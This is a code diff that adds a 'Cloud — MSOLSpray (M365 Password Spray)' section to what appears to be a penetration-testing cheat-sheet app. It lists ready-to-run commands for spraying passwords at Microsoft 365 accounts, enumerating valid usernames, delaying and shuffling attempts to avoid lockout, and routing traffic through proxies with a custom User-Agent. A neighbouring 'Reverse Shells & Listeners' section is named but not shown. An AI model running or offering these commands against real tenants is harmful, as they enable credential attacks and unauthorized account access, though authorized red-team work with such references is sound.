@@ -179,6 +179,26 @@ const SECTIONS = [
     ]
   },
   {
+    id: 'msolspray',
+    emoji: '\u{2601}\u{FE0F}',
+    title: 'Cloud — MSOLSpray (M365 Password Spray)',
+    commands: [
+      { title: 'MSOLSpray — Clone repo', desc: 'Download MSOLSpray from GitHub', diff: 'easy', code: 'git clone https://github.com/joswr1ght/MSOLSpray.git' },
+      { title: 'MSOLSpray — Install deps', desc: 'Install Python requirements', diff: 'easy', code: 'pip3 install -r requirements.txt' },
+      { title: 'MSOLSpray — Basic spray', desc: 'Password spray users with one password', diff: 'hard', code: 'python3 MSOLSpray.py -u <user_file> -p <password>' },
+      { title: 'MSOLSpray — Single user', desc: 'Test creds for one account', diff: 'hard', code: 'python3 MSOLSpray.py -t <email> -p <password>' },
+      { title: 'MSOLSpray — User enum', desc: 'Enumerate valid M365 usernames', diff: 'hard', code: 'python3 MSOLSpray.py -u <user_file> --enum' },
+      { title: 'MSOLSpray — Custom domain', desc: 'Target specific domain', diff: 'hard', code: 'python3 MSOLSpray.py -u <user_file> -p <password> -d <domain>' },
+      { title: 'MSOLSpray — Delay', desc: 'Wait between attempts to avoid lockout', diff: 'hard', code: 'python3 MSOLSpray.py -u <user_file> -p <password> --delay <seconds>' },
+      { title: 'MSOLSpray — Safe mode', desc: 'Stop if account lockouts detected', diff: 'hard', code: 'python3 MSOLSpray.py -u <user_file> -p <password> --safe' },
+      { title: 'MSOLSpray — Verbose', desc: 'Detailed auth responses', diff: 'medium', code: 'python3 MSOLSpray.py -u <user_file> -p <password> -v' },
+      { title: 'MSOLSpray — Save output', desc: 'Write results to file', diff: 'medium', code: 'python3 MSOLSpray.py -u <user_file> -p <password> -o <output>' },
+      { title: 'MSOLSpray — Shuffle users', desc: 'Randomize user order during spray', diff: 'medium', code: 'python3 MSOLSpray.py -u <user_file> -p <password> --shuffle' },
+      { title: 'MSOLSpray — Proxy', desc: 'Route through Burp/socks proxy', diff: 'hard', code: 'python3 MSOLSpray.py -u <user_file> -p <password> --proxy http://<ip>:<port>' },
+      { title: 'MSOLSpray — Custom UA', desc: 'Set custom User-Agent header', diff: 'medium', code: 'python3 MSOLSpray.py -u <user_file> -p <password> --useragent "<ua>"' },
+    ]
+  },
+  {
     id: 'shells',
     emoji: '\u{1F41A}',
     title: 'Reverse Shells & Listeners',
